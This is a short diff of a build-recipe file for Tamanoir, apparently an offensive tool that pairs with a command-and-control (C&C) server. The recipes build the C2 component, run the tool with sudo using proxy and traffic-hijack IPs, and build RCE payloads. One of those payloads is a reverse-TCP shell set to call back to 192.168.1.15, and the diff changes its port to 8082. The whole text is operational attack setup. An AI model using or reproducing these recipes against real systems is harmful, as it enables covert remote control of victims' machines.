@@ -17,7 +17,7 @@ build-c2:
     cargo build -p tamanoir-c2 --release
 
 # Run Tamanoir
-run proxy_ip hijack_ip="8.8.8.8" layout="1" log_level="info":
+run proxy_ip="192.168.1.15" hijack_ip="8.8.8.8" layout="1" log_level="info":
     RUST_LOG={{log_level}} sudo -E target/release/tamanoir --proxy-ip {{proxy_ip}} --hijack-ip {{hijack_ip}} --layout {{layout}}
 
 # Talk to the C&C server
@@ -42,7 +42,7 @@ c2_run:
 
 #rce build (run on c2 server)
 rce_build_reverse_tcp :
-    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=192.168.1.15 PORT=8083"
+    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=192.168.1.15 PORT=8082"
 rce_build_hello :
     ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/hello
 
